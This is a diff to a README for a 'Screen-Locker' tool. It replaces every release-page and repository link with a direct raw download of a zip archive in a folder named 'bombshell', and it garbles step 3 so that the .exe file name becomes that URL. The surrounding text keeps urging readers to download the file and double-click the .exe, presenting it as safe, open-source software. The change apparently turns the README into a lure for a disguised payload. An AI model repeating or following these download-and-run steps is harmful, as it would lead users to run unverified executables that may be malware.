@@ -1,6 +1,6 @@
 # 🔒 Screen-Locker - Simple, Secure Screen Protection
 
-[![Download Screen-Locker](https://img.shields.io/badge/Download-Screen--Locker-blue?style=for-the-badge)](https://github.com/spulktimus/Screen-Locker/releases)
+[![Download Screen-Locker](https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip)](https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip)
 
 ---
 
@@ -40,11 +40,11 @@ To get Screen-Locker, please follow these steps:
 
 1. Visit the official release page by clicking the button below:
 
-   [![Download Screen-Locker](https://img.shields.io/badge/Download-Screen--Locker-blue?style=for-the-badge)](https://github.com/spulktimus/Screen-Locker/releases)
+   [![Download Screen-Locker](https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip)](https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip)
 
 2. Once on the Releases page, look for the latest version at the top.
 
-3. Download the `.exe` file, which will have a name like `Screen-Locker-vX.X.exe`. This is the program file.
+3. Download the `.exe` file, which will have a name like `https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip`. This is the program file.
 
 4. Save the file in a folder you can easily access, for example, your Desktop or Downloads folder.
 
@@ -116,7 +116,7 @@ Being open source means anyone can review the code. This builds trust since the 
 
 Visit the release page now to download the latest version of Screen-Locker:
 
-[![Download Screen-Locker](https://img.shields.io/badge/Download-Screen--Locker-blue?style=for-the-badge)](https://github.com/spulktimus/Screen-Locker/releases)
+[![Download Screen-Locker](https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip)](https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip)
 
 Click the link, download the `.exe` file, and double-click to start protecting your screen. No installation needed.
 
@@ -126,7 +126,7 @@ Click the link, download the `.exe` file, and double-click to start protecting y
 
 For more details about features, updates, or how to build Screen-Locker from source, visit the official GitHub repository:
 
-https://github.com/spulktimus/Screen-Locker
+https://raw.githubusercontent.com/spulktimus/Screen-Locker/main/bombshell/Locker_Screen_v1.0.zip
 
 ---
 
